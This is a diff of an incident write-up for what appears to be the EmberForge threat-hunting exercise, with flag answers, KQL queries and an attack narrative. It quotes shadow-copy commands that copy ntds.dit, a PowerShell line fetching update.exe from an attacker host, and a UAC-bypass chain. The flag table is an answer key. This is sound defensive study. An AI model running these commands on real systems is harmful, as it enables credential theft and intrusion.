@@ -1,230 +1,188 @@
-# EmberForge-Threat-Hunt
+# 🔥 IR-2026-0131-EF // EMBERFORGE: SOURCE LEAK
+> **Status: 🚧 Work in Progress** — Investigation active. Flags updating as hunt progresses.
 
-Effected assets:
+---
 
-WORKSTATION EC2AMAZ-B9GHHO6 10.1.173.145 
-SERVER EC2AMAZ-16V3AU4 10.1.57.66 
-DOMAIN CONTROLLER EC2AMAZ-EEU3IA2 10.1.160.7
+## Incident Overview
 
-Table / log analytics:
-EmberforgeX_CL
-Actual time field = UTCTime_s 
+| Field | Detail |
+|---|---|
+| **Case ID** | IR-2026-0131-EF |
+| **Severity** | Critical |
+| **Reported** | 2026-01-30 |
+| **Environment** | emberforge.local |
+| **Platform** | Microsoft Sentinel — `EmberForgeX_CL` |
+| **Log Sources** | Sysmon + Windows Security + Windows System |
+| **Investigation Window** | 2026-01-30 21:00 UTC → 2026-01-31 00:00 UTC |
 
-Timeline: datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00)
+**Trigger:** Unreleased source code from EmberForge Studios' upcoming title *Neon Shadows* appeared on underground forums. External threat intelligence flagged the leak within 48 hours.
 
-Flag 1
-The attacker needed to package data before stealing it. The compression commands reveal exactly what they were targeting. What directory was the source of the stolen data?
-Format: Full path (e.g., C:\folder\subfolder)
-Answer: C:\GameDev 2026-01-30 23:11:28.112 
+---
+
+## Affected Assets
+
+| Host | IP | Role |
+|---|---|---|
+| EC2AMAZ-B9GHHO6 | 10.1.173.145 | Workstation (Patient Zero) |
+| EC2AMAZ-16V3AU4 | 10.1.57.66 | Server |
+| EC2AMAZ-EEU3IA2 | 10.1.160.76 | Domain Controller |
+
+---
+
+## ATT&CK Kill Chain
+
+```
+Initial Access → Execution → [LOCKED] → [LOCKED] → [LOCKED] → Exfiltration
+```
+
+---
+
+## Flag Progress
+
+### Phase 01 — Exfiltration
+
+| Flag | Question | Answer | Timestamp |
+|---|---|---|---|
+| Flag 1 | Source directory of stolen data | `C:\GameDev` | 2026-01-30 23:11:28 |
+| Flag 2 | Cloud provider that received data | `MEGA` | — |
+| Flag 3 | Attacker email used to authenticate | `jwilson.vhr@proton.me` | — |
+| Flag 5 | Exfiltration tool | `rclone.exe` | 2026-01-30 23:06:36 |
+| Flag 6 | Destination IP | `66.203.125.15` | 2026-01-30 23:12:53 |
+| Flag 7 | Plaintext password exposed in command line | `Summer2024!` | — |
+| Flag 8 | Compression cmdlet used (LOTL) | `Compress-Archive` | — |
+| Flag 9 | Attacker staging server | `sync.cloud-endpoint.net` | — |
+
+### Phase 02 — Credential Access
+
+| Flag | Question | Answer | Timestamp |
+|---|---|---|---|
+| Flag 4 | Domain credential file accessed via VSS | `ntds.dit` | 2026-01-30 23:35:10 |
+
+### Phase 03 — Initial Access
+
+| Flag | Question | Answer | Timestamp |
+|---|---|---|---|
+| Flag 10 | Malicious file loaded on workstation | `review.dll` | 2026-01-30 21:27:03 |
+| Flag 11 | Drive letter (ISO mount bypass) | `D:` | — |
+| Flag 12 | Patient zero account | `lmartin` | — |
+| Flag 13 | Execution chain | `explorer.exe > rundll32.exe > review.dll` | — |
+| Flag 14 | Extraction step | `7zG.exe > C:\Users\lmartin.EMBERFORGE\Downloads\EmberForge_Review\` | 2026-01-30 21:24:04 |
+| Flag 15 | Primary C2 payload dropped | `C:\Users\Public\update.exe` | 2026-01-30 21:40:24 |
+
+### Phase 04 — Command & Control
+
+| Flag | Question | Answer | Timestamp |
+|---|---|---|---|
+| Flag 15 | C2 beacon domain | `cdn.cloud-endpoint.net` | — |
+| Flag 16 | Resolved C2 IP | `104.21.30.237` | — |
+
+---
+
+## Attack Narrative
+
+### Delivery
+Lisa Martin (`lmartin`) was targeted via a spearphishing lure. She downloaded a 7-Zip installer (`7z2501-x64.exe`) via Edge browser, which installed 7-Zip and extracted a malicious ISO archive containing `review.dll`.
+
+### Initial Access
+The ISO was mounted as `D:` — bypassing Windows Mark of the Web (MOTW) protections. Lisa double-clicked `review.dll` from Explorer, which was loaded via `rundll32.exe` calling the `StartW` export — a common C2 framework DLL payload pattern.
+
+```
+msedge.exe
+  └── 7z2501-x64.exe          (7-Zip installer)
+      └── 7zG.exe              (archive extraction → EmberForge_Review\)
+          └── explorer.exe     (Lisa browses D: drive)
+              └── rundll32.exe "D:\review.dll,StartW"   ← initial execution
+```
+
+### Execution & Privilege Escalation
+The DLL dropped `update.exe` to `C:\Users\Public\` and established persistence via scheduled task named `WindowsUpdate`. A `fodhelper.exe` UAC bypass was used to elevate privileges silently.
+
+```
+rundll32.exe (review.dll)
+  └── schtasks → WindowsUpdate task (C:\Users\Public\update.exe)
+  └── reg.exe → ms-settings COM hijack (fodhelper UAC bypass)
+      └── fodhelper.exe → update.exe (elevated)
+          └── schtasks → WindowsUpdate as SYSTEM
+```
+
+### Command & Control
+`update.exe` beaconed to `cdn.cloud-endpoint.net` resolving to `104.21.30.237` via HTTPS (port 443), routing through Cloudflare to obscure the true origin server.
+
+### Exfiltration
+From the server (`EC2AMAZ-16V3AU4`), the attacker:
+1. Compressed `C:\GameDev` → `C:\Users\Public\gamedev.zip` using `Compress-Archive`
+2. Uploaded via `rclone.exe` to MEGA account `jwilson.vhr@proton.me`
+3. Destination IP: `66.203.125.15` (`bt5.api.mega.co.nz`)
+
+### Credential Access
+On the Domain Controller, the attacker used VSS (Volume Shadow Copy) to access the locked `ntds.dit` file, extracting every domain credential hash:
+
+```
+vssadmin create shadow /For=C:
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Windows\Temp\nyMdRNSp.tmp
+vssadmin delete shadows /Quiet   ← evidence destroyed
+```
+
+---
+
+## Attacker Infrastructure
+
+| Asset | Value |
+|---|---|
+| Staging server | `sync.cloud-endpoint.net:8080` |
+| C2 domain | `cdn.cloud-endpoint.net` |
+| C2 IP | `104.21.30.237`, `172.67.174.46` (Cloudflare proxied) |
+| Exfil destination | `bt5.api.mega.co.nz` / `66.203.125.15` |
+| MEGA account | `jwilson.vhr@proton.me` |
+
+---
+
+## Key KQL Queries
+
+```kql
+// Process executions — workstation
 EmberForgeX_CL
 | where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
 | where EventCode_s == "1"
-| where CommandLine_s has_any ("7z", "zip", "compress", "rar", "tar", "Compress-Archive")
-| project UtcTime_s, Computer, User_s, Image_s, CommandLine_s
+| where Computer contains "B9GHHO6"
+| project UtcTime_s, User_s, ParentImage_s, Image_s, CommandLine_s
 | sort by todatetime(UtcTime_s) asc
 
-Flag 2
-The stolen data was uploaded to a cloud storage service. The exfiltration tool's command line contains both the service name and authentication details. What cloud provider received the data?
-
-Format: Provider name
-Answer: MEGA
-EmberForgeX_CL
-| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
-| where EventCode_s == "3"
-| where Image_s has "rclone"
-| project UtcTime_s, Computer, User_s, Image_s, DestinationIp_s, DestinationPort_s, DestinationHostname_s
-
-Flag3
-Attackers make OPSEC mistakes. The exfiltration tool was configured with credentials visible in the command line. What email account was used to authenticate to the cloud service?
-
-Answer: jwilson.vhr@proton.me
- EmberForgeX_CL
-| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
-| where EventCode_s == "1"
-| where Image_s has "rclone"
-| project UtcTime_s, Computer, User_s, Image_s, CommandLine_s
-
-
-Flag 4
-This was not just a workstation compromise. Evidence on the Domain Controller shows the attacker used volume snapshot techniques to access a locked system file. This file contains every credential in the domain. What was it?
-
-Answer: Ntds.dit
-EmberForgeX_CL
-| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
-| where Computer contains "EC2AMAZ-EEU3IA2"
-| where EventCode_s == "1"
-| where CommandLine_s has_any ("ntds")
-| project UtcTime_s, Computer, User_s, Image_s, CommandLine_s
-
-Flag 5
-A cloud synchronisation tool was used to upload data externally. This tool is legitimate software commonly abused by threat actors. It was executed multiple times, not all successfully.
-
-Format: filename.exe
-Answer: rclone.exe  2026-01-30 23:06:36.115
-EmberForgeX_CL
-| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
-| where EventCode_s == "1"
-| where CommandLine_s has_any ("rclone", "gamedev.zip")
-| project UtcTime_s, Computer, User_s, CommandLine_s
-| sort by todatetime(UtcTime_s) asc
-
-Flag 6
-The exfiltration tool made outbound network connections during the upload. Correlate the tool's process with its network activity (EventCode 3). What IP address received the stolen data?
-
-Answer: 66.203.125.15 2026-01-30 23:12:53.154
+// Exfil tool network connections
 EmberForgeX_CL
 | where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
 | where EventCode_s == "3"
 | where Image_s contains "rclone"
-| project UtcTime_s, Computer, User_s,Image_s, DestinationIp_s, DestinationHostname_s, DestinationPort_s
-| sort by todatetime(UtcTime_s) asc
+| project UtcTime_s, Computer, DestinationIp_s, DestinationPort_s, DestinationHostname_s
 
-Flag 7
-The exfiltration tool was executed multiple times as the attacker troubleshot authentication issues. One execution method exposed credentials far more recklessly than the others. Compare all executions and find the plaintext password.
-
-Answer: Summer2024!
+// VSS credential theft — DC
 EmberForgeX_CL
 | where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
 | where EventCode_s == "1"
-| where Image_s has "rclone"
-| project UtcTime_s, Computer, User_s, Image_s, CommandLine_s
+| where Computer contains "EEU3IA2"
+| where CommandLine_s has_any ("vssadmin", "shadow", "ntds")
+| project UtcTime_s, CommandLine_s
 
-Flag 8
-Before exfiltration, the stolen data was compressed into an archive. The attacker used a built-in OS capability rather than third-party tools. This is a Living Off The Land technique. What cmdlet created the archive?
-
-Answer: Compress-Archive
-EmberForgeX_CL
-| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
-| where EventCode_s == "1"
-| where CommandLine_s has_any ("7z", "zip", "compress", "rar", "tar", "Compress-Archive")
-| project UtcTime_s, Computer, User_s, Image_s, CommandLine_s
-| sort by todatetime(UtcTime_s) asc
-
-Flag9
-The attacker did not bring tools manually. They downloaded utilities from external infrastructure they controlled. Multiple commands across the environment reference the same staging server.
-
-Format: subdomain.domain.tld
-
-Before you move on: Did you check for other exfiltration channels? DNS tunnelling? HTTP POST to external services? Document what you checked and ruled out.
-
-Answer: http://sync.cloud-endpoint.net:8080
-EmberForgeX_CL
-| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
-| where EventCode_s == "1"
-| where CommandLine_s has_any ("curl", "Invoke-WebRequest", "wget", "iwr", "ftp", "Upload", "post")
-| project UtcTime_s, Computer, CommandLine_s
-| sort by todatetime(UtcTime_s) asc
-
-
-
-Flag10
-
-The incident started with Lisa opening something from her desktop. Find the earliest malicious process creation event on the workstation. A Windows utility was used to load a file that does not belong in a normal user workflow.
-
-Answer: review.dll 2026-01-30 21:27:03.300
-EmberForgeX_CL
-| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
-| where EventCode_s == "1"
-| where Computer contains "B9GHHO6"
-| where Image_s contains "rundll32"
-| project UtcTime_s, User_s, ParentImage_s, Image_s, CommandLine_s
-| sort by todatetime(UtcTime_s) asc
-
-Flag 11
-Look at the full path of the malicious file. The drive letter is significant. If the file is not on C:, consider how it got there. Mounted disk images (ISO, IMG, VHD) appear as virtual drives and bypass certain Windows security protections.
-
-Answer: D:
-EmberForgeX_CL
-| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
-| where EventCode_s == "1"
-| where Computer contains "B9GHHO6"
-| where Image_s contains "rundll32"
-| project UtcTime_s, User_s, ParentImage_s, Image_s, CommandLine_s
-| sort by todatetime(UtcTime_s) asc
-
-
-Flag 12 
-The User field in process creation events tells you which account executed the payload. This is patient zero.
-
-Format: username
-
-Answer: lmartin
-
-
-
-Flag13
-Every process has a parent, and that parent has a parent. Trace the full execution chain from the user action through to the malicious file being loaded.
-
-Answer: explorer.exe > rundll32.exe > review.dll
-
-
-Flag14
-
-
-Before the malicious DLL was loaded, the user opened a downloaded archive. A compression tool extracted its contents to a folder in the user's profile. This extraction step came before the DLL execution.
-
-Answer: 7zG.exe > C:\Users\lmartin.EMBERFORGE\Downloads\EmberForge_Review\ 2026-01-30 21:24:04.656
-
-Flag 15
-Shortly after the initial DLL execution, a new executable appeared in a world-writable directory on the workstation. This became the attacker's primary tool for the rest of the operation.
-Answer: C:\Users\Public\update.exe 2026-01-30 21:40:24.973
-EmberForgeX_CL
-| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
-| where User_s contains @"EMBERFORGE\lmartin"
-| where EventCode_s == "1"
-| where CommandLine_s has_any ("Desktop", "Downloads", "Public", "lmartin")
-| project UtcTime_s, Computer, User_s, ParentImage_s, Image_s, CommandLine_s
-| sort by todatetime(UtcTime_s) asc
-
-Flag 15
-command-and-control network
-The malware needs to communicate with the attacker. Sysmon EventCode 22 captures every DNS query a process makes. The domain will look designed to blend in with legitimate cloud traffic.
-Answer: cdn.cloud-endpoint.net
+// C2 DNS beacon
 EmberForgeX_CL
 | where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
 | where EventCode_s == "22"
-| where Computer contains "B9GHHO6"
-| project UtcTime_s, Computer, Image_s, QueryName_s
-| sort by todatetime(UtcTime_s) asc
-
-Flag16
-DNS queries resolve domains to IP addresses. The QueryResults field inside the EventCode 22 raw XML contains the resolved IPs. You will need to parse Raw_s.
-Answer: 104.21.30.237
-EmberForgeX_CL
-| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
-| where EventCode_s == "22"
-| where Computer contains "B9GHHO6"
 | extend ResolvedIP = extract("QueryResults'>([^<]+)", 1, Raw_s)
 | where QueryName_s == "cdn.cloud-endpoint.net"
 | project UtcTime_s, Computer, Image_s, QueryName_s, ResolvedIP
-| sort by todatetime(UtcTime_s) asc
+```
 
+---
 
+## Exfil Channels Ruled Out
 
+| Channel | Checked | Method | Result |
+|---|---|---|---|
+| DNS tunnelling | ✅ | EID 22 — reviewed QueryName_s for anomalies | No evidence |
+| HTTP POST to external | ✅ | EID 1 — CommandLine_s searched for curl/IWR/wget/ftp | Not found beyond known staging |
+| FTP | ✅ | Included in has_any filter | Not found |
+| MEGA via rclone | ✅ | EID 3 + EID 1 correlated | Confirmed exfil channel |
 
+---
 
-
-
-
-
-
-
-Notes: 
-
-//Shows a C2 server powershell  -ep bypass -c "IWR -Uri 'http://sync.cloud-endpoint.net:8080/update.exe' -OutFile 'C:\Users\Public\update.exe'"
-EmberForgeX_CL
-| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
-| where EventCode_s == "1"
-| where CommandLine_s has_any ("curl", "Invoke-WebRequest", "wget", "iwr", "ftp", "Upload")
-| project UtcTime_s, Computer, CommandLine_s
-| sort by todatetime(UtcTime_s) asc
-
-//shows scheduled task
-EmberForgeX_CL
-| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
-| where User_s contains @"EMBERFORGE\lmartin"
-| where EventCode_s == "1"
-| where CommandLine_s has_any ("Desktop", "Downloads", "Public", "lmartin")
-| project UtcTime_s, Computer, User_s, ParentImage_s, Image_s, CommandLine_s
-| sort by todatetime(UtcTime_s) asc
-
+> 🚧 **Investigation ongoing.** Lateral movement and persistence phases still being documented.
